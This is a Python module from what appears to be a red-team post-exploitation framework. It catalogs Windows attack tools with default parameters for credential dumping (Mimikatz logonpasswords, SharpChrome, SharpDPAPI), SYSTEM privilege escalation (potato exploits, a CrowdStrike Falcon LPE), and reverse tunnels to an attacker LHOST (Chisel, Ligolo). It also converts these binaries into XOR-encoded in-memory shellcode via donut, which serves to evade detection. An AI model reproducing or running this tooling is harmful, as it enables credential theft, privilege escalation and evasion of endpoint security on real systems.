import os
import struct
import subprocess
import tempfile
import shutil

from core.encoding import pack_enc, find_donut as _find_donut

_HERE     = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_WIN_BINS = os.path.join(_HERE, "windows")
_POT_BINS = os.path.join(_HERE, "potatoes")
_LEGACY   = os.path.join(_HERE, "windows-binaries")
_RP_BINS  = os.path.join(_HERE, "RoguePlanet")


def _win(*name):
    return [
        os.path.join(_WIN_BINS, *name),
        os.path.join(_LEGACY,   *name),
    ]


def _pot(*name):
    """Privilege-escalation binaries — checked in potatoes/ then windows-binaries/."""
    return [
        os.path.join(_POT_BINS, *name),
        os.path.join(_LEGACY,   *name),
    ]


def resolve_params(params: str | None, lhost: str) -> str | None:
    """Substitute LHOST placeholder in tool param strings (Chisel, RoguePotato, etc.)."""
    if params is None:
        return None
    return params.replace("LHOST", lhost)


TOOL_CATALOG: dict[str, dict] = {
    "Rubeus": {
        "paths": _win("Rubeus.exe"),
        "default_params": "triage",
        "desc": "Kerberos abuse toolkit",
    },
    "SharpHound": {
        "paths": _win("SharpHound.exe"),
        "default_params": "-c All --memcache",
        "desc": "BloodHound AD collector",
    },
    "Certify": {
        "paths": _win("Certify.exe"),
        "default_params": "find /vulnerable",
        "desc": "AD CS certificate abuse",
    },
    "Seatbelt": {
        "paths": _win("Seatbelt.exe"),
        "default_params": "-group=all -full",
        "desc": "Host security survey",
    },
    "SharpDPAPI": {
        "paths": _win("SharpDPAPI.exe"),
        "default_params": "triage",
        "desc": "DPAPI credential extraction",
    },
    "SharpUp": {
        "paths": _win("SharpUp.exe"),
        "default_params": "audit",
        "desc": "Privilege escalation checks",
    },
    "SharpChrome": {
        "paths": _win("SharpChrome.exe"),
        "default_params": "logins",
        "desc": "Chrome saved credentials",
    },
    "Mimikatz": {
        "paths": _win("mimikatz.exe"),
        "default_params": "privilege::debug sekurlsa::logonpasswords exit",
        "desc": "Credential extraction",
    },
    "GodPotato": {
        "paths": _pot("GodPotato-NET4.exe"),
        "default_params": '-cmd "cmd /c whoami"',
        "desc": "SeImpersonate → SYSTEM (Win11 24H2)",
    },
    "PrintSpoofer": {
        "paths": _pot("PrintSpoofer64.exe"),
        "default_params": "-i -c cmd",
        "desc": "SeImpersonate → SYSTEM (Print Spooler, x64)",
    },
    "PrintSpoofer32": {
        "paths": _pot("PrintSpoofer32.exe"),
        "default_params": "-c cmd",
        "desc": "SeImpersonate → SYSTEM (Print Spooler, x86 target)",
    },
    "JuicyPotato": {
        "paths": _pot("JuicyPotato.exe"),
        "default_params": "-l 1337 -p cmd.exe -t *",
        "desc": "SeImpersonate/SeAssignPrimaryToken → SYSTEM (pre-2019)",
    },
    "RoguePotato": {
        "paths": _pot("RoguePotato.exe"),
        "default_params": "-r LHOST -e cmd.exe -l 9999",
        "desc": "SeImpersonate → SYSTEM via OXID resolver",
        "lhost_placeholder": True,
    },
    "RoguePlanet": {
        "paths": [os.path.join(_RP_BINS, "RoguePlanet.exe"), *_pot("RoguePlanet.exe")],
        "default_params": "",
        "desc": "WD race condition → SYSTEM (Win10/11, no Server, race-condition LPE)",
    },
    "KrbRelayUp": {
        "paths": _win("KrbRelayUp.exe"),
        "default_params": "full -m shadowcred",
        "desc": "Kerberos relay privilege escalation",
    },
    "Whisker": {
        "paths": _win("Whisker.exe"),
        "default_params": "list",
        "desc": "Shadow Credentials abuse",
    },
    "SharpGPOAbuse": {
        "paths": _win("SharpGPOAbuse.exe"),
        "default_params": "--help",
        "desc": "GPO privilege escalation",
    },
    "ADSearch": {
        "paths": _win("ADSearch.exe"),
        "default_params": "--search objectClass=user",
        "desc": "Custom LDAP queries",
    },
    "SQLRecon": {
        "paths": _win("SQLRecon.exe"),
        "default_params": "/enum:sqlspns",
        "desc": "MSSQL enumeration + RCE",
    },
    "winPEAS": {
        "paths": _win("winPEAS.exe"),
        "default_params": "",
        "desc": "Privilege escalation scanner",
    },
    "RunasCs": {
        "paths": _win("RunasCs.exe"),
        "default_params": "",
        "desc": "Execute as alternate user",
    },
    "Chisel": {
        "paths": _win("chisel.exe"),
        "default_params": "client LHOST:8081 R:socks",
        "desc": "SOCKS5 tunnel over HTTP",
        "lhost_placeholder": True,
    },
    "Ligolo": {
        "paths": _win("ligolo-agent.exe"),
        "default_params": "-connect LHOST:11601 -ignore-cert",
        "desc": "Layer 3 tunnel (Ligolo-ng agent)",
        "lhost_placeholder": True,
    },
    "kerbrute": {
        "paths": _win("kerbrute_windows_amd64.exe"),
        "default_params": "",
        "desc": "Kerberos user enum / password spray (x64)",
    },
    "HiveLoader": {
        "paths": _win("HiveLoader.exe"),
        "default_params": "",
        "desc": "Hive planting: offline reg + oplock → UsrClass.dat hijack (req offreg.dll)",
    },
    "FalconFlank": {
        "paths": _win("FalconFlank.exe"),
        "default_params": "",
        "desc": "CrowdStrike Falcon LPE → SYSTEM via bcrypt.dll DLL plant + MareBackup task (Win11 25H2+, Falcon Phase 3)",
    },
}


def is_dotnet_assembly(binary_path: str) -> bool:
    """Return True if the PE has a CLR directory entry (.NET managed assembly)."""
    try:
        with open(binary_path, "rb") as f:
            if f.read(2) != b"MZ":
                return False
            f.seek(0x3C)
            pe_off = struct.unpack("<I", f.read(4))[0]
            f.seek(pe_off)
            if f.read(4) != b"PE\x00\x00":
                return False
            f.seek(pe_off + 24)
            opt_magic = struct.unpack("<H", f.read(2))[0]
            if opt_magic == 0x10B:      # PE32
                f.seek(pe_off + 24 + 0x60 + 14 * 8)
            elif opt_magic == 0x20B:    # PE32+
                f.seek(pe_off + 24 + 0x70 + 14 * 8)
            else:
                return False
            clr_rva, clr_size = struct.unpack("<II", f.read(8))
            return clr_rva != 0 and clr_size != 0
    except Exception:
        return False


def encode_tool_clr(binary_path: str, output_path: str) -> bool:
    """Pack a .NET assembly as a two-layer XOR .enc without donut.
    The runner loads this via Assembly.Load() — no native CLR COM calls."""
    try:
        with open(binary_path, "rb") as f:
            raw = f.read()
    except OSError as e:
        print(f"[!] Cannot read {binary_path}: {e}")
        return False

    encoded = pack_enc(raw)
    with open(output_path, "wb") as f:
        f.write(encoded)
    size_kb = len(raw) / 1024
    print(f"[+] {os.path.basename(binary_path)} → {output_path} ({size_kb:.1f} KB .NET, CLR path — no donut)")
    return True


def find_tool(name: str) -> str | None:
    entry = TOOL_CATALOG.get(name)
    if not entry:
        return None
    for p in entry.get("paths", []):
        if os.path.exists(p):
            return p
    return None


def find_tool_icase(name: str) -> str | None:
    """Case-insensitive catalog lookup, returns catalog key or None."""
    for k in TOOL_CATALOG:
        if k.lower() == name.lower():
            return k
    return None


def encode_tool(binary_path: str, params: str | None, output_path: str) -> bool:
    """Encode a tool for in-memory execution.
    .NET assemblies (CLR header present): packed directly, no donut — Assembly.Load() path.
    Native EXEs: donut shellcode → XOR encoded."""
    if is_dotnet_assembly(binary_path):
        return encode_tool_clr(binary_path, output_path)

    shellcode: bytes | None = None

    donut_cli = _find_donut()
    if donut_cli:
        with tempfile.TemporaryDirectory(prefix="lt_enc_") as tmp:
            raw_sc = os.path.join(tmp, "shellcode.bin")
            cmd = [donut_cli, "-i", binary_path, "-f", "1", "-o", raw_sc]
            if params:
                cmd += ["-p", params]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0 and os.path.exists(raw_sc):
                with open(raw_sc, "rb") as f:
                    shellcode = f.read()
            else:
                print(f"[!] donut CLI failed for {binary_path}:\n{result.stderr.strip()}")

    if shellcode is None:
        try:
            import donut as _donut_py
            shellcode = _donut_py.create(file=binary_path, params=params or "")
        except ImportError:
            pass
        except Exception as e:
            print(f"[!] donut Python API failed: {e}")

    if shellcode is None:
        print("[!] donut not available — install with: pip install donut-shellcode")
        return False

    encoded = pack_enc(shellcode)
    with open(output_path, "wb") as f:
        f.write(encoded)

    size_kb = len(shellcode) / 1024
    print(f"[+] {os.path.basename(binary_path)} → {output_path} ({size_kb:.1f} KB shellcode)")
    return True


def list_tools():
    print(f"\n{'Tool':<20} {'Description':<42} {'Default Params'}")
    print("-" * 85)
    for name, info in TOOL_CATALOG.items():
        found = "✓" if find_tool(name) else "✗"
        desc   = info.get("desc", "")
        params = info.get("default_params", "")[:28]
        note   = " [LHOST]" if info.get("lhost_placeholder") else ""
        print(f"[{found}] {name:<18} {desc:<42} {params}{note}")
    print()
